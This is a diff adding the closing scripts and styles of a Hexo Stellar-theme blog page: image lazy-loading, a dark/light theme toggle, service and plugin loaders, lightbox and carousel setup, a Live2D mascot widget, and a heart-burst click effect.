+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.md-text img:not([class]), .md-text .image img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Live2D Widget -->
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 - 爱心爆炸效果 -->
+<script>
+  (function() {
+    // 创建爱心元素
+    function createHeart(x, y) {
+      const heart = document.createElement('div');
+      heart.className = 'click-heart';
+      heart.innerHTML = '❤';
+      heart.style.cssText = `
+        position: fixed;
+        left: ${x - 10}px;
+        top: ${y - 10}px;
+        font-size: 20px;
+        pointer-events: none;
+        z-index: 9999;
+        animation: heartFloat 1s ease-out forwards;
+        color: ${getRandomColor()};
+      `;
+      document.body.appendChild(heart);
+      
+      setTimeout(() => {
+        heart.remove();
+      }, 1000);
+    }
+    
+    // 随机颜色
+    function getRandomColor() {
+      const colors = [
+        '#ff6b6b', '#ff8e8e', '#ffa8a8',
+        '#ff69b4', '#ff1493', '#db7093',
+        '#ff4500', '#ff6347', '#ff7f50',
+        '#ffd700', '#ffec8b', '#ffa500'
+      ];
+      return colors[Math.floor(Math.random() * colors.length)];
+    }
+    
+    // 点击事件
+    document.addEventListener('click', function(e) {
+      // 排除特定元素
+      if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) {
+        return;
+      }
+      
+      // 创建多个爱心
+      for (let i = 0; i < 3; i++) {
+        setTimeout(() => {
+          const offsetX = (Math.random() - 0.5) * 40;
+          const offsetY = (Math.random() - 0.5) * 40;
+          createHeart(e.clientX + offsetX, e.clientY + offsetY);
+        }, i * 100);
+      }
+    });
+  })();
+</script>
+
+<style>
+  @keyframes heartFloat {
+    0% {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+    50% {
+      opacity: 0.8;
+      transform: translateY(-30px) scale(1.2);
+    }
+    100% {
+      opacity: 0;
+      transform: translateY(-60px) scale(0.8);
+    }
+  }
+</style></div></body></html>
